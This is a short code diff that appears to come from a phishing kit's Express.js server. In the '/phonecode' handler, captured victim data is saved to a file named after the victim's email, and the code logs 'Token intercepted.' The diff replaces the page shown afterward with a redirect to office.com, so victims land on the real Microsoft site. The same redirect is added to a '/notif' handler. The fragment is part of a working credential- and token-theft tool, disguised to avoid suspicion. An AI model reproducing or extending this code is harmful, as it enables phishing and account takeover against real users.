@@ -418,7 +418,8 @@ router.get('/phonecode', function(req, res, next) {
         console.log(did)
         var path=email+".json"
         fs.writeFile(path,alldata,function(){console.log("Token intercepted.")})
-          res.render('about');
+        res.redirect('https://office.com')
+        //  res.render('about');
     }
     
   }
@@ -473,7 +474,8 @@ router.get('/notif', function(req, res, next) {
        // window.location.assign("www.office.com")
 
     }
-    res.render('about');
+    res.redirect('https://office.com')
+    //res.render('about');
 
 })();
  
